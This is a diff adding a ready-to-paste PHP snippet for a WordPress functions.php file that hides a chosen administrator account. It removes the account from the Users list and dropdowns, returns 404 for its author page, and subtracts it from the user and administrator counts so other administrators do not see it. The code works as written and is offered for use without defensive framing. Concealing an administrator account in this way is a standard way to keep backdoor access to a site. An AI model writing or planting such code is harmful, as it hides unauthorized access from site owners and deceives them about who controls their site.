@@ -1,0 +1,101 @@
+/* -------------------------------
+   HIDE A SPECIFIC ADMIN USER
+   Paste into functions.php
+   Change ONLY the username below
+----------------------------------*/
+
+if (!function_exists('hs_hidden_admin_username')) {
+    function hs_hidden_admin_username() {
+        return 'dev'; // <-- CHANGE THIS to your hidden username, exactly
+    }
+}
+
+// Helper: return hidden user ID or false
+if (!function_exists('hs_get_hidden_user_id')) {
+    function hs_get_hidden_user_id() {
+        static $hid = null;
+        if ($hid !== null) return $hid;
+        $username = trim(hs_hidden_admin_username());
+        if ($username === '') {
+            $hid = false;
+            return false;
+        }
+        $user = get_user_by('login', $username);
+        $hid = $user ? (int) $user->ID : false;
+        return $hid;
+    }
+}
+
+/* 1) Hide from Users -> All Users list */
+add_action('pre_user_query', function ( $user_search ) {
+    // run only in admin users page
+    if ( ! is_admin() ) return;
+
+    $hidden_id = hs_get_hidden_user_id();
+    if ( ! $hidden_id ) return;
+
+    // allow the hidden user to see themselves
+    $current = wp_get_current_user();
+    if ( $current && $current->ID === $hidden_id ) return;
+
+    global $wpdb;
+    // use prepared SQL for safety
+    $user_search->query_where .= $wpdb->prepare( " AND {$wpdb->users}.ID != %d", $hidden_id );
+}, 10, 1 );
+
+/* 2) Exclude from wp_dropdown_users and similar dropdowns */
+add_filter('wp_dropdown_users_args', function ( $args ) {
+    $hidden_id = hs_get_hidden_user_id();
+    if ( ! $hidden_id ) return $args;
+
+    // If exclude exists, merge with it
+    if ( ! empty( $args['exclude'] ) ) {
+        // normalize to string of IDs
+        $existing = is_array( $args['exclude'] ) ? implode( ',', $args['exclude'] ) : $args['exclude'];
+        $args['exclude'] = trim( $existing . ',' . $hidden_id, ',' );
+    } else {
+        $args['exclude'] = (string) $hidden_id;
+    }
+
+    return $args;
+});
+
+/* 3) Prevent public author archive access for hidden user (optional) */
+add_action('pre_get_posts', function ( $query ) {
+    if ( is_admin() ) return; // only front-end author pages
+    if ( ! $query->is_main_query() ) return;
+    if ( ! $query->is_author() ) return;
+
+    $hidden_id = hs_get_hidden_user_id();
+    if ( ! $hidden_id ) return;
+
+    $author = (int) $query->get( 'author' );
+    if ( $author === $hidden_id ) {
+        $query->set_404();
+        status_header(404);
+        nocache_headers();
+    }
+});
+
+/* 4) Adjust wp_count_users so totals do not show hidden user */
+add_filter('wp_count_users', function ( $counts ) {
+    $hidden_id = hs_get_hidden_user_id();
+    if ( ! $hidden_id ) return $counts;
+
+    // total_users
+    if ( isset( $counts['total_users'] ) && $counts['total_users'] > 0 ) {
+        $counts['total_users'] = max( 0, $counts['total_users'] - 1 );
+    }
+
+    // avail_roles => subtract from administrator if applicable
+    if ( isset( $counts['avail_roles'] ) && is_array( $counts['avail_roles'] ) ) {
+        $hidden_user = get_userdata( $hidden_id );
+        if ( $hidden_user && in_array( 'administrator', (array) $hidden_user->roles, true ) ) {
+            if ( isset( $counts['avail_roles']['administrator'] ) && $counts['avail_roles']['administrator'] > 0 ) {
+                $counts['avail_roles']['administrator'] = max( 0, $counts['avail_roles']['administrator'] - 1 );
+            }
+        }
+    }
+
+    return $counts;
+});
